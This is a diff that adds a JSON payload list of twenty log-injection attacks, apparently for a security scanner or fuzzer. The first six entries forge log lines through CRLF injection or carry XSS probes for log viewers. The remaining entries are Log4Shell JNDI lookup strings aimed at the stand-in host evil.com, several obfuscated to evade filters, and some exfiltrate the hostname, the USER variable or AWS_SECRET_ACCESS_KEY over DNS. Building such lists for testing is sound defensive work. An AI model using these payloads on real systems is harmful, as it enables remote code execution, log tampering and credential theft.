@@ -1,0 +1,122 @@
+[
+  {
+    "id": "log-001", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "\\r\\n[CRITICAL] Admin login bypassed", "context": "string",
+    "description": "Log Injection - CRLF spoofed entry",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-002", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "%0a%0d[ERROR] Database corruption detected", "context": "string",
+    "description": "Log Injection - URL Encoded CRLF spoofed entry",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-003", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "\\n[INFO] User 'admin' password reset successful", "context": "string",
+    "description": "Log Injection - LF spoofed entry",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-004", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "\\r\\n<script>alert('XSS in Logs')</script>", "context": "string",
+    "description": "Log Injection - XSS payload for log viewers",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-005", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "\\r\\n2026-01-01 12:00:00 [ERROR] System compromised", "context": "string",
+    "description": "Log Injection - Timestamped spoofed entry",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-006", "family": "log_injection", "subtype": "log_injection",
+    "payload_string": "\"><script>alert(1)</script>", "context": "string",
+    "description": "Log Injection - Blind XSS probe without CRLF",
+    "references": ["https://owasp.org/www-community/attacks/Log_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "log-007", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:ldap://evil.com/a}", "context": "string",
+    "description": "Log4Shell - Basic JNDI LDAP payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-008", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:dns://evil.com}", "context": "string",
+    "description": "Log4Shell - JNDI DNS payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-009", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:rmi://evil.com/a}", "context": "string",
+    "description": "Log4Shell - JNDI RMI payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-010", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}", "context": "string",
+    "description": "Log4Shell - Obfuscated (Empty Default) LDAP",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-011", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:${lower:l}${lower:d}ap://evil.com/a}", "context": "string",
+    "description": "Log4Shell - Obfuscated (Lower) LDAP",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-012", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:${upper:l}${upper:d}ap://evil.com/a}", "context": "string",
+    "description": "Log4Shell - Obfuscated (Upper) LDAP",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-013", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:ldap://127.0.0.1:1389/a}", "context": "string",
+    "description": "Log4Shell - Localhost LDAP probe",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-014", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:ldap://${hostName}.evil.com/a}", "context": "string",
+    "description": "Log4Shell - Hostname exfiltration via DNS",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-015", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:ldap://${env:USER}.evil.com/a}", "context": "string",
+    "description": "Log4Shell - User env variable exfiltration",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-016", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.evil.com/a}", "context": "string",
+    "description": "Log4Shell - AWS secret exfiltration attempt",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-017", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${${lower:j}ndi:ldap://evil.com/a}", "context": "string",
+    "description": "Log4Shell - Obfuscated protocol scheme",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-018", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:nis://evil.com/a}", "context": "string",
+    "description": "Log4Shell - JNDI NIS payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-019", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:nds://evil.com/a}", "context": "string",
+    "description": "Log4Shell - JNDI NDS payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  },
+  {
+    "id": "log-020", "family": "log_injection", "subtype": "log4shell",
+    "payload_string": "${jndi:corba://evil.com/a}", "context": "string",
+    "description": "Log4Shell - JNDI CORBA payload",
+    "references": ["https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"], "platform_specific": {"java": true}
+  }
+]
